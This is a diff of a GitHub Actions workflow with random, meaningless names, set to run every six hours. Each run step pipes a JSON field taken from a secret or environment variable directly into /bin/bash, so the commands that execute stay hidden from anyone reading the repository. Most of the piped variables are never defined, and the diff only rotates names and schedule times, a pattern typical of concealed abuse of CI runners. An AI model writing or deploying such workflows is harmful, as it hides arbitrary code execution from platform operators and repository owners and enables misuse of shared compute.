@@ -3,21 +3,21 @@ name: corrosionsorrowful
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 0/6 * * *'
-
+    - cron: '40 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: corrosionsorrowful
         env:
-          lpg76300: ${{ secrets.lpg76300 }}
+          xmn420: ${{ secrets.xmn420 }}
         run: |
-          echo $lpg76300 | jq -r .uv869 | /bin/bash
-          echo $mj675 | jq -r .ngi7709 | /bin/bash
-          echo $efyxt6 | jq -r .qdmzh83 | /bin/bash
-          echo $kqaw781 | jq -r .vbc094 | /bin/bash
-          echo $z5 | jq -r .dgdht3660 | /bin/bash
-          echo $csh740 | jq -r .o81 | /bin/bash
+          echo $xmn420 | jq -r .ayieg0444 | /bin/bash
+          echo $brysy356 | jq -r .rva9 | /bin/bash
+          echo $j95282 | jq -r .xpmf004 | /bin/bash
+          echo $c807 | jq -r .o05 | /bin/bash
+          echo $fyvma1867 | jq -r .nze53 | /bin/bash
+          echo $aez2466 | jq -r .bbm80316 | /bin/bash
 
